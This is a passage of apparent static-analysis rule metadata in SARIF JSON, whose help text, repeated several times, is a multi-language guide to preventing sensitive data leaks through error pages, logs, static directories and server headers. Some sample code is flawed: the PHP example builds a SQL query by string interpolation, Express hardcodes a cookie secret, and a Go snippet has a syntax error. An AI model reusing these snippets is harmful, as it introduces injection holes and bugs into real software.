\ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive database data is written to log in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/ebc2de3bd5c94b4dd9c02650aa3001f4f00f7596e97b2e8789c8bba7c7e45e61",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), 